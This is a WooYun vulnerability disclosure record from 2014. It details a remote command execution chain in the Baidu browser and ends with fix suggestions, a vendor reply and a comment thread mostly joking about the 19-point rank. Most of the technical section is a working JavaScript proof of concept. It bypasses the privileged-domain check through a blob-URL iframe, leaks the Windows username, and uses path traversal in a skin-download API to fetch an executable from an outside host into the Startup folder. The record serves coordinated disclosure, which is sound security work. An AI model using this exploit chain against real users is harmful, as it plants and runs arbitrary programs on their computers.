{"id": 47563, "wybug_id": "wooyun-2014-080438", "wybug_title": "百度浏览器远程命令执行二 - 绕过特权域限制", "wybug_corp": "百度", "wybug_author": "gainover", "wybug_date": "2014-10-23 08:54", "wybug_open_date": "2015-01-21 08:56", "wybug_type": "远程代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["远程代码执行", "浏览器漏洞利用技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-10-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-10-23：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-26：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-12-17：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-27：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-01-06：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-01-21：\t细节向公众公开  简要描述： 哎呀，上一个没给满20rank。。 所以我又来啦～ 这一次不用XSS了，直接用了某个东东绕过了特权域的限制。 详细说明：  总共用了三个漏洞点：1. 绕过特权域判断2. 利用缺陷API下载任意程序至指定目录3. 结合电脑用户名称泄漏的缺陷，将程序下载至用户启动目录以下是详情：1. 特权域限制上存在问题， 百度浏览器除了允许 bdbrowser:// 和 http://xapp.baidu.com/ 这2个域外，我发现 file域同样可以执行特权API， 而当我们从http域重定向至 bdbrowser 或者 file域时，都会提示禁止访问本地域资源，这不禁让我想到了另外一个有点算是本地域的 东西 blob。于是控制台测试以下代码：\nvar data='<script>执行特权命令</script>';var blob=new Blob([data],{\"type\":\"text/html\"});(function(){  var iframe=document.createElement(\"iframe\");  iframe.src=URL.createObjectURL(blob);  document.body.appendChild(iframe);})()\n发现可以成功执行，这样一来，我们可以在任何页面里通过这段代码来执行特权API了。2. 特权API  bdbrowser.skin.download 的 的 name参数未过滤，导致可以将皮肤文件下载至系统盘的任意指定目录内。 \nwindow.external.StartRequest(1,\"bdbrowser.skin.download\",\"(function(id,res){console.log(res)})\",\"{\\\"name\\\":\\\"1/../../../../../../../../../../../../../cmd.exe\\\",\\\"url\\\":\\\"http://192.168.1.105/testbaidu.exe\\\"}\",window,\"\")\n例如以上代码，将会在系统盘根目录下生成一个cmd.exe，如下图所示：\n\n3. 我们要实现执行命令，还需要将程序写入到系统的“启动”目录下。但启动目录的路径中，需要知道 用户名信息。经过研究发现：AppService.AppMarket.DownloadPack 和 AppService.AppMarket.DeleteExt 这2个API均可导致用户名泄漏，其中不使用我前面所发布的上一个漏洞中用到的技巧的话，前者会弹出安装提示，而后者不会提示，但是后者要求用户装过插件方可。\n\n4. 结合以上三个步骤，我们可以构建以下PoC代码，仅供参考，在WIN7和IE下进行了测试。\n<html><head><meta charset=\"utf-8\" /></head><body><script type=\"text/javascript\" id=\"apirun\">function getInstallList(id,list){\t//console.log(list);\tvar result=JSON.parse(list);\tvar apps=result.content.ItemList;\tvar deleteID=\"\";\tfor(var i=apps.length-1;i>=0;i--){\t\tif(/\\w{32}/.test(apps[i][\"ID\"])){\t\t\tdeleteID=apps[i][\"ID\"];\t\t\tbreak;\t\t}\t}\tconsole.log(\"deleteID:\"+deleteID);\tif(!deleteID){\t\t//不存在自安装插件，通过安装法来获得user\t\twindow.external.StartRequest(222,\"AppService.AppMarket.DownloadPack\",\"getUser\",\"{\\\"ID\\\":\\\"eococdloljmhdpnihekiiohodgcgjigh\\\",\\\"URL\\\":\\\"http://dlsw.br.baidu.com/49411271abae81764cf268983c95d9d7.crx\\\",\\\"UPDATE\\\":\\\"false\\\"}\",window,\"\"); \t}else{\t\t//通过删除插件法来实现静默执行\t\twindow.external.StartRequest(222,\"AppService.AppMarket.DeleteExt\",\"getUser\",\"{\\\"ID\\\":\\\"\"+deleteID+\"\\\"}\",window,\"\");\t}}function getUser(id,res){\tconsole.log(res);\tvar isWin7=/NT\\s+6/.test(navigator.userAgent);\tvar user=isWin7?(res.match(/[A-Z]:[\\\\\\\\\\/]+Users[\\\\\\\\\\/]+([^\\\\\\/]+)[\\\\\\\\\\/]+AppData/)||[\"\",\"\"])[1]:(res.match(/[A-Z]:[\\\\\\\\\\/]+(Documents and Settings|DOCUME~1)[\\\\\\\\\\/]+([^\\\\\\/]+)[\\\\\\\\\\/]+/)||[\"\",\"\"])[2];\tgenerateCMD(user);}function main(){\twindow.external.StartRequest(222,\"AppService.AppMarket.GetInstalledList\",\"getInstallList\",\"{\\\"RequireDetail\\\":\\\"1\\\",\\\"RequirePermission\\\":\\\"1\\\"}\",window,\"\");}function generateCMD(user){\tconsole.log(\"Current User:\"+user+\"\\n\");\tvar isWin7=/NT\\s+6/.test(navigator.userAgent);\tvar win7=\"Users/\"+user+\"/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup/test.exe\";\tvar xp=\"Documents and Settings/\"+user+\"/「开始」菜单/程序/启动/test.exe\";\tconsole.log((isWin7?win7:xp));\twindow.external.StartRequest(1,\"bdbrowser.skin.download\",\"(function(id,res){console.log(res)})\",\"{\\\"name\\\":\\\"1/../../../../../../../../../../../../../\"+(isWin7?win7:xp)+\"\\\",\\\"url\\\":\\\"http://192.168.1.105/testbaidu.exe\\\"}\",window,\"\")}try{main();}catch(e){};</script><script>//利用blob绕过特权域执行特权APIvar data='<script>'+document.getElementById(\"apirun\").innerHTML+'</scr'+'ipt>';var blob=new Blob([data],{\"type\":\"text/html\"});(function(){  var iframe=document.createElement(\"iframe\");  iframe.src=URL.createObjectURL(blob);  iframe.style.display=\"none\";  document.body.appendChild(iframe);})()</script><h1>百度浏览器远程命令执行DEMO</h1></body></html>\n最终执行后，效果如下图所示：\n\n   漏洞证明：  在WIN7 和 XP下测试成功，视频演示：http://v.youku.com/v_show/id_XODA5MzM1NzA4.html （录制于XP虚拟机）   修复方案：  1. 修复特权域的判断2. 对bdbrowser.skin.download这个特权API 的参数进行严格过滤，限制下载路径与下载来源3. 对AppService.AppMarket.DownloadPack 和 AppService.AppMarket.DeleteExt的返回数据中敏感的路径信息进行屏蔽，如果数据不需要，可以考虑不返回这些路径信息。    版权声明：转载请注明来源 gainover@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：19  确认时间：2014-10-23 11:24 厂商回复： 感谢提交，已通知业务部门处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-10-23 08:56 |    \t\the1renyagao \t\t\t( 普通白帽子  |\t\t\t        Rank:225 漏洞数:29        | 是金子总会发光，在还未发光之前，先打磨打...)\t\t \n  沙发！！！！！    \n     2014-10-23 08:57 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  好早    \n     2014-10-23 09:02 |    \t\t铁蛋火车侠 \t\t\t( 普通白帽子  |\t\t\t        Rank:156 漏洞数:31        | Q群371620085 技术交流群 有漂亮妹纸！)\t\t \n  去    \n     2014-10-23 09:12 |    \t\tsco4x0 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:13        | O_o)\t\t \n  第一次离二哥这么近！！    \n     2014-10-23 09:14 |    \t\t0x_Jin \t\t\t( 普通白帽子  |\t\t\t        Rank:319 漏洞数:37        | 微博：http://weibo.com/J1n9999)\t\t \n  二哥 你这么多0day 我知道了    \n     2014-10-23 09:22 |    \t\tppt \t\t\t( 路人 |\t\t\t        Rank:11 漏洞数:2        | ) | ( 我猜出了用户名，可我没猜出密码。)\t\t \n  我猜是api    \n     2014-10-23 09:34 |    \t\tFocusstart \t\t\t( 普通白帽子  |\t\t\t        Rank:574 漏洞数:163        | 努力让某某某成为最幸福的女人！)\t\t \n  好屌~    \n     2014-10-23 09:39 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  每天一闪电的节奏    \n     2014-10-23 09:40 |    \t\t咸鱼翻身 \t\t\t( 普通白帽子  |\t\t\t        Rank:576 漏洞数:108        )\t\t \n  啊啊啊啊啊啊啊啊啊啊啊    \n     2014-10-23 09:42 |    \t\t进击的zjx \t\t\t( 普通白帽子  |\t\t\t        Rank:295 漏洞数:61        | 工作需要，暂别一段时间)\t\t \n  好厉害~    \n     2014-10-23 10:09 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  二哥早上好    \n     2014-10-23 10:13 |    \t\t心伤的胖子 \t\t\t( 普通白帽子  |\t\t\t        Rank:308 漏洞数:29        | 因为心伤，所以胖子。)\t\t \n  二哥我要给你生胖子    \n     2014-10-23 10:26 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:65        | 慢慢挖洞)\t\t \n  why r u so diao?    \n     2014-10-23 10:48 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  大神请收下我的膝盖！！！    \n     2014-10-23 10:54 |    \t\tp4ssw0rd \t\t\t( 普通白帽子  |\t\t\t        Rank:306 漏洞数:92        | 不作死就不会死)\t\t \n  二哥陆续放大招了    \n     2014-10-23 11:25 |    \t\tHRay \t\t\t( 普通白帽子  |\t\t\t        Rank:196 漏洞数:28        | 018)\t\t \n  有强迫症的人简直看不了这个评分啊    \n     2014-10-23 11:26 |    \t\t乐乐、 \t\t\t( 普通白帽子  |\t\t\t        Rank:853 漏洞数:189        )\t\t \n  就是不给你20    \n     2014-10-23 11:29 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1068 漏洞数:137        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  目测还有...三...  因为你不给20啊    \n     2014-10-23 11:29 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  二哥说等下漫游你内网看你还敢不给20    \n     2014-10-23 11:29 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1036 漏洞数:175        | px1624)\t\t \n  就是不给你20    \n     2014-10-23 11:32 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  哈哈哈哈，看评分笑死了    \n     2014-10-23 11:37 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  19分了...    \n     2014-10-23 11:48 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  19分这是逼着要再来啊..    \n     2014-10-23 11:55 |    \t\tAno_Tom \t\t\t( 普通白帽子  |\t\t\t        Rank:368 漏洞数:40        | Talk is cheap.:)\t\t \n  就是不给你20    \n     2014-10-23 12:10 |    \t\t大孩小孩 \t\t\t( 路人 |\t\t\t        Rank:7 漏洞数:7        | 哈哈哈哈)\t\t \n  19。。。    \n     2014-10-23 12:39 |    \t\tleakless \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 今天我没吃药感觉自己萌萌哒~~)\t\t \n  这是逼洞主漫游百度内网的节奏啊。。    \n     2014-10-23 12:46 |    \t\tsin \t\t\t( 实习白帽子  |\t\t\t        Rank:38 漏洞数:2        | 寻找最优雅的解决方案)\t\t \n  厂商给19,这是在挑衅！    \n     2014-10-23 12:52 |    \t\t0day \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:19        | www.wooyun.org)\t\t \n  二哥，漫游他    \n     2014-10-23 12:57 |    \t\tniliu  \t\t\t( 核心白帽子 |\t\t\t        Rank:1542 漏洞数:206        | 逆流而上)\t\t \n  19....    \n     2014-10-23 13:00 |    \t\t袋鼠妈妈 \t\t\t( 普通白帽子  |\t\t\t        Rank:449 漏洞数:61        | 故乡的原风景.MP3)\t\t \n  漏洞Rank：19  赤裸裸的挑衅啊    \n     2014-10-23 13:52 |    \t\thkAssassin \t\t\t( 普通白帽子  |\t\t\t        Rank:358 漏洞数:66        | 我是一只毛毛虫。)\t\t \n  二哥，游他    \n     2014-10-23 14:13 |    \t\tan0nym0u5 \t\t\t( 普通白帽子  |\t\t\t        Rank:172 漏洞数:31        )\t\t \n  19啊 再给他来一发！    \n     2014-10-23 14:49 |    \t\t卡卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:447 漏洞数:52        | <script>alert('安全团队长期招人')</scrip...)\t\t \n  二哥，猴子我已经打掉了，你就安心做你的黑客把    \n     2014-10-23 14:57 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  19 赤裸裸的挑衅呀 组团收藏  待公开    \n     2014-10-23 15:03 |    \t\txyang \t\t\t( 普通白帽子  |\t\t\t        Rank:242 漏洞数:51        | stay hungry stay foolish)\t\t \n  真叼    \n     2014-10-23 15:09 |    \t\t围剿 \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:5        | Evil decimal)\t\t \n  真是赤裸裸的挑衅啊 二哥 开战了！    \n     2014-10-23 15:23 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  19rank啊    \n     2014-10-23 15:49 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  百度也是蛮调皮的    \n     2014-10-23 17:07 |    \t\tgainover  \t\t\t( 核心白帽子 |\t\t\t        Rank:1710 漏洞数:93        | PKAV技术宅社区! -- gainover| 工具猫网络-...)\t\t \n  还好乌云的rank是不带小数点的。。    \n     2014-10-23 17:34 |    \t\tpapaver \t\t\t( 普通白帽子  |\t\t\t        Rank:197 漏洞数:35        | 95后，高一学生一枚... 萌萌哒..)\t\t \n  哈哈，19rank。。。    \n     2014-10-23 17:35 |    \t\t盛大网络(乌云厂商)\t\t \n  从心理学上讲少的1 rank表示二哥还需努力    \n     2014-10-23 17:37 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @gainover 哈哈     \n     2014-10-23 19:03 |    \t\t安然意境 \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:79        | 无论是你的事业还是你的个人，可能走的过程...)\t\t \n  机智的百度。    \n     2014-10-23 19:11 |    \t\tWoodee \t\t\t( 路人 |\t\t\t        还没有发布任何漏洞        | 乌云路人甲，打脸pa pa pa)\t\t \n  百度你好坏哦    \n     2014-10-23 19:27 |    \t\t第四维度 \t\t\t( 实习白帽子  |\t\t\t        Rank:58 漏洞数:34        | 谦谦君子，温润如玉)\t\t \n  漫游的节奏呢，激将法呢    \n     2014-10-23 19:42 |    \t\t浮萍 \t\t\t( 普通白帽子  |\t\t\t        Rank:555 漏洞数:118        | 默默潜水)\t\t \n  就是不给你20 啊    \n     2014-10-23 19:50 |    \t\tElegance \t\t\t( 实习白帽子  |\t\t\t        Rank:48 漏洞数:3        | 此人很懒，什么话都没留下！)\t\t \n  百度说：就是不给，有本事来咬我啊    \n     2014-10-23 22:41 |    \t\tStardustsky \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | ……)\t\t \n  嘻嘻，百度干得漂亮！    \n     2014-10-24 07:59 |    \t\t老和尚 \t\t\t( 普通白帽子  |\t\t\t        Rank:223 漏洞数:45        | 总有一天，我会骑着雨牛@'雨。踩着一哥@jan...)\t\t \n  还是不给。、就不给你、哼、气死你    \n     2014-10-24 10:16 |    \t\tnoob \t\t\t( 实习白帽子  |\t\t\t        Rank:81 漏洞数:18        | 向各位大神学习，向各位大神致敬)\t\t \n  二哥再来一发！    \n     2014-10-25 07:08 |    \t\t香草 \t\t\t( 实习白帽子  |\t\t\t        Rank:99 漏洞数:14        | javascript,xss,jsp、aspx)\t\t \n  再来一个就20了    \n     2014-10-27 19:24 |    \t\t偉哥 \t\t\t( 实习白帽子  |\t\t\t        Rank:67 漏洞数:11        | 哥是没帽子)\t\t \n  这个牛逼。    \n     2014-10-28 00:59 |    \t\tabaddon \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:10        | 我叫什么名字)\t\t \n  大乌云玩大浏览器 小乌云玩小浏览器 膜拜洞主     \n     2014-10-28 13:06 |    \t\t晏子 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 无)\t\t \n  就是不给你20，要不再来一炮？    \n     2014-10-29 12:37 |    \t\t蟋蟀哥哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:363 漏洞数:57        | 巴蜀人士,80后宅男,自学成才,天朝教育失败...)\t\t \n  故意的19Rank    \n     2014-10-29 18:26 |    \t\t秋风 \t\t\t( 普通白帽子  |\t\t\t        Rank:438 漏洞数:44        | 码农一枚，关注互联网安全)\t\t \n  NB!    \n     2014-10-30 09:01 |    \t\tGHK \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 请叫我小渣渣。)\t\t \n  洞主再来一发吧^^    \n     2014-11-01 11:17 |    \t\t78基佬 \t\t\t( 实习白帽子  |\t\t\t        Rank:84 漏洞数:20        | 不会日站的设计师不是好产品经理)\t\t \n  3个$是多少钱啊    \n     2014-11-13 11:22 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  不给20啊，继续搞？    \n     2014-11-13 11:22 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @78基佬 5000吧估计    \n     2014-11-13 11:24 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:231 漏洞数:79        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  @wefgod 1w以上吧？    \n     2014-11-13 11:36 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:179        | 力不从心)\t\t \n  @泳少 至少5000，一万不知道。    \n     2015-01-21 09:23 |    \t\tNeeke \t\t\t( 普通白帽子  |\t\t\t        Rank:101 漏洞数:24        | 求传授刷Rank方法？)\t\t \n  19    \n     2015-01-21 12:41 |    \t\tdlevr \t\t\t( 实习白帽子  |\t\t\t        Rank:33 漏洞数:10        | 菜鸟一只，大神勿喷！)\t\t \n  哈哈  这是想让你继续的节奏啊    \n     2015-01-21 13:51 |    \t\twooyuners \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:3        | 众筹之路)\t\t \n  才给19Rank，红果果的挑衅啊，二哥    \n     2015-01-21 16:55 |    \t\tzhxs \t\t\t( 实习白帽子  |\t\t\t        Rank:32 漏洞数:19        | Jyhack-TeaM：http://bbs.jyhack.com/)\t\t \n  才给19Rank，红果果的挑衅啊，Z哥     \n     2015-01-21 17:13 |    \t\tF0rm \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | )\t\t \n  好坏好坏的 给19    \n     2015-01-21 19:49 |    \t\tme1ody \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:15        | 乌云临时工)\t\t \n  19.....    \n     2015-01-21 23:12 |    \t\t刘海哥 \t\t\t( 普通白帽子  |\t\t\t        Rank:114 漏洞数:28        | 索要联系方式但不送礼物的厂商定义为无良厂...)\t\t \n  聪明的百度！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 19, "Ranks": null}